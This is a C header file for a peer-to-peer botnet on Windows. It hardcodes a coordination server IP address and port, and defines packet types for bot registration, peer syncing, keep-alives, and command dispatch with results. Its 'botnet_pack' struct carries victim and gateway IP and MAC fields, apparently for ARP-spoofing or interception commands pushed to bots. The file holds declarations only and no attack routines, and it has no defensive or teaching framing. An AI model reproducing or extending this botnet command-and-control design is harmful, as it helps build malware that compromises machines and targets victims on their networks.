#pragma once
#include <stdint.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#define HOLE_PUNCHING_SERVER_PORT 3301
#define HOLE_PUNCHING_SERVER_IP "15.237.26.178"

enum PACK_TYPE
{
	//UDP
	SYNC_REQUEST, // Used when a bot wants to tell it exists
	SYNC_REPLY, // Used to send network structure syncs

	PEER_REQUEST,
	PEER_REPLY,
	NETWORK_SYNC_REQUEST,
	NETWORK_SYNC,

	KEEP_ALIVE,
	KEEP_ALIVE_ACK,

	COMMAND,
	COMMAND_RESULT,
	//TCP
	VERSION_SYNC_REQUEST, //Ask for database info 
	VERSION_SYNC //Sync database info
	,
};

#pragma pack(push, 1)
struct network_adapter
{
	ULONG32 hip;
	ULONG32 netmask;
	ULONG32 broadcast;
};

typedef struct {
	uint32_t ip;
	uint16_t port;
} adr;

struct botnet_pack
{
	enum PACK_TYPE type;
	/*-------commnad-------*/
	BYTE act;
	ULONG32 gateway_ip;
	ULONG32 victim_ip;
	BYTE gateway_mac[6];
	BYTE victim_mac[6];
	/*---------------------*/
	
	/*--p2p-communication--*/
	union
	{
		uint16_t id; // commands 
		uint16_t num_of_hosts; // p2p establishing
	} numerics ;
	
	adr dst_peer, private_peer;
	/*---------------------*/
};
#pragma pack(pop)

#ifdef __cplusplus
extern "C"
{
#endif
	extern const size_t BOTNET_PACK_SIZE;
	extern struct network_adapter DEC_ADAPTER_IPS_ARR[20];
	extern size_t adapters_count;

	int check(int exp, const char* msg);
	void init_winsock();
	void init_network_settings();
#ifdef __cplusplus
}
#endif